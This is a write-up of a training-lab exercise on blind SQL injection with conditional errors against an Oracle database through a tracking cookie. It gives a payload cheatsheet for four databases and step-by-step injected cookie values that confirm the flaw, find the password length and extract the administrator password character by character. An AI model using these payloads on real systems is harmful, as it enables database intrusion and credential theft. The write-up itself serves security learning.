# Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.
# Solution
- Blind SQL injection with conditional errors is used when the previous SQLi with conditional responses does not work, meaning the return of `TRUE` and `FALSE` are same (difficult to verify or recognise).
## Cheatsheet
- You can test a single boolean condition and trigger a database error if the condition is true.

| DB         | Description                                                                             |
| ---------- | --------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

 1) **Prove the cookie is vulnerable to SQLi:**
Modify the cookie:
```
Cookie: TrackingId=WfKNbl117PLDttg'
```
=> The error message is received cause the quotation is not escaped.

Append two quotation mark:
```
Cookie: TrackingId=WfKNbl117PLDttg''
```
=> Verify that the error disappears -> the quotation gets escaped.

Now we can test more command injection to confirm that it is the SQLi. To do this, you first need to construct a subquery using valid SQL syntax. 

Try submitting:
```
'||(SELECT '')||'
```
=> Receive error -> Perhaps due to the database type.

Try some table name:
```
'||(SELECT '' FROM dual)||'
```
=> Receive 200 response.

```
'||(SELECT '' FROM dualsqweqwe)||'
```
=> Receive error (the table not existed).

-> Because of getting two different responses, you can confirm that it is the **Oracle** DB.

2) **Verify that the** `users` **table exists:**
```
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
=> Receive 200 response.

- `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.

```
'||(SELECT '' FROM usersdsa WHERE ROWNUM = 1)||'
```
=> Receive error (the table not existed).

-> Because of getting two different responses, you can confirm that the `users` table exists.

3) **Verify that the** `administrator` **exists in** `user` **table with** `username` **and** `password` **columns:**
```
'||(SELECT '' FROM users WHERE username = 'administrator')||'
```
=> Return 200 response code.

```
'||(SELECT '' FROM users WHERE username = 'administrator123123')||'
```
=> Also return 200 response code.

```ad-note
It is impossible to verify whether `administrator` user exists as the returning of two commands above is **same**.
=> Use **conditional errors** to solve it with the addition of `CASE`.
```

To take an advantage of **conditional error** mechanism -> use `CASE`
```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
=> 500 internal error.

```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator1231231')||'
```
=> 200 response code.

```ad-summary
Now we can realize that username will exist if returning **error response**, not normal one.
```

4) **Determine the length of password**
The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:
```
'||(SELECT CASE WHEN LENGTH(password)>$1$ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![](../../Image/Pasted%20image%2020250516143916.png)

=> The web application responds 500 server error until reaching the number 20 -> 20 chars in password.

5) **Find the password of administrator user**

```
'||(SELECT CASE WHEN SUBSTR(password,$1$,1) = '$s$' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

```ad-note
Use **SUBSTR()** for Oracle Databases.
```

![](../../Image/Pasted%20image%2020250516151815.png)

- Get filtered by **500 server error** response code.

=> administrator:fyd1kq0ox1nwac9u0tgw